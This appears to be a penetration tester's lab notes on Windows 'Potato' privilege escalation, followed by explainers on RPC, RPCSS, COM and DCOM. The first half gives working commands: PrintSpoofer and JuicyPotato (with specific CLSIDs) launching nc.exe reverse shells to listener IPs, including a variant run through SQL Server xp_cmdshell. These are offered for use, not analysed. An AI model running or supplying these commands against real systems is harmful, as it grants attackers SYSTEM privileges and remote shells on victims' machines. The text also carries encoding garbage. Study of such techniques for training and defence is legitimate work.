Potato privilege escalation is usually used when we obtain WEB/database privileges. We can elevate a service user with low privileges to "NT AUTHORITY\SYSTEM"
## Impact:
	- PrivEsc to   NT Authority/System`
## Requirements
- for windows server 2019 & windows 10 1809: try printspoofer, then Rouge Potato, 
- for 2016 and less try juicypotato
---
### exploitation steps
- for printspoofer:it runs flawlessly out of the box
- if it fails make sure spool is running
## printspoofer (most straightforward way)
`nc -nlvp 4444`
`reverse shell`
```
printspoofer.exe ¬†-i -c "C:\Users\Public\nc.exe 10.10.16.26 4444 -e cmd.exe"
```

`inside xp_cmdshell`
```
SQL (WINLPE-SRV01\sql_dev ¬†dbo@master)> EXEC xp_cmdshell 'C:\Users\Public\printspoofer.exe ¬†-i -c "C:\Users\Public\nc.exe 10.10.16.26 4444 -e cmd.exe"';
```

---
#### Escalating Privileges Using Juicy-potato
JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. 
```shell-session
sudo nc -lnvp 8443
```

```shell-session
.\potato.exe -l 53375 -p c:\windows\system32\cmd.exe -c winmgmt:{8BC3F05E-D86B-11D0-A075-00C04FB68820} -a "/c c:\Users\Public\Documents\nc.exe 10.10.16.19 8443 -e cmd.exe" -t *
```

```
for juicy potato to work you need the `CLSID` for the OS ur on,
use Get-CLSID.ps1 to get it and find CLSID FROM THE REPO FOR JUICYPOTATO

\potato.exe -l 4001 -p c:\windows\system32\cmd.exe -c {4661626C-9F41-40A9-B3F5-5580E80CB347} -a "/c c:\Users\Public\Documents\nc.exe 10.10.16.19 8443 -e cmd.exe" -t *

```

---
## Extra Notes

- When a privilege is listed for our account in the `Disabled` state, it means that our account has the specific privilege assigned. Still, it cannot be used in an access token to perform the associated actions until it is enabled. Windows does not provide a built-in command or PowerShell cmdlet to enable privileges, so we need some scripting to help us out. We will see ways to abuse various privileges throughout this module and various ways to enable specific privileges within our current process. One example is this PowerShell [script](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1) which can be used to enable certain privileges, or this [script](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) which can be used to adjust token privileges.
-
### üîó RPC (Remote Procedure Call)

- **A protocol/technology** ‚Äî a way for one process to execute a function in another process, locally or across the network.
    
- Think of it as the ‚Äúlanguage‚Äù or ‚Äúhighway‚Äù Windows uses for inter-process and inter-host communication.
    
- Used in tons of Windows services:
    
    - Active Directory
    - SMB
    - Print Spooler
    - COM/DCOM
        
- On Windows, RPC runs over **named pipes (local)** or **TCP/IP (network)**.
    

üëâ **RPC = the communication mechanism.**

---

### üèõÔ∏è RPCSS (Remote Procedure Call Subsystem Service)

- **A Windows service** that runs in the background (you‚Äôll see it in `services.msc`).
    
- Lives at: `C:\Windows\system32\rpcss.dll`
    
- Runs as **NT AUTHORITY\SYSTEM**.
    
- Responsibilities:
    
    - Manages **COM/DCOM object activation**.
        
    - Registers and looks up **RPC endpoints** (so clients know how to reach servers).
        
    - Routes calls to the correct service.
        
    - Enforces some **security contexts** (which token a COM object runs under).
        

üëâ **RPCSS = the SYSTEM-level traffic cop / broker that makes RPC + COM/DCOM actually work.**

---

# üèõÔ∏è What‚Äôs RPCSS?

- **RPCSS = Remote Procedure Call Subsystem service**.
    
- It‚Äôs a **Windows core service** that:
    
    - Manages **COM/DCOM object activation**.
        
    - Routes **RPC requests** between processes/services.
        
    - Runs as **SYSTEM** because it‚Äôs central to OS communication.
        

üëâ That‚Äôs why attackers love it: if you trick `Rpcss`, you‚Äôre messing with a process that already runs at

# ‚öôÔ∏è COM & DCOM Explained (pentester-level)

### üß© COM (Component Object Model)

- A **Microsoft framework** (dating back to the 90s) that lets software expose ‚Äúcomponents‚Äù (objects) which other programs can use.
    
- Each component (a **COM object**) is defined by a **CLSID** (GUID).
    
- Example: ‚ÄúTask Scheduler‚Äù or ‚ÄúBITS downloader‚Äù exposes COM objects.
    
- **Local**: One process on a machine can request/use a COM object provided by another process.
    
- COM takes care of:
    
    - Object creation (instantiation).
        
    - Inter-process communication (IPC).
        
    - Security (what token/context the object runs under).
        

üëâ **So COM is basically a system for sharing reusable objects between programs on the same machine.**

---

### üåê DCOM (Distributed COM)

- DCOM = **COM over the network (using RPC)**.
    
- Extends COM so that a program on _Machine A_ can request a COM object that runs on _Machine B_.
    
- RPCSS (the RPC service) handles all the heavy lifting:
    
    - Listening on network ports.
        
    - Spawning remote COM objects.
        
    - Handling authentication.
        

üëâ **So DCOM is ‚ÄúCOM but remote‚Äù ‚Äî a program can activate/use a COM object on another machine.**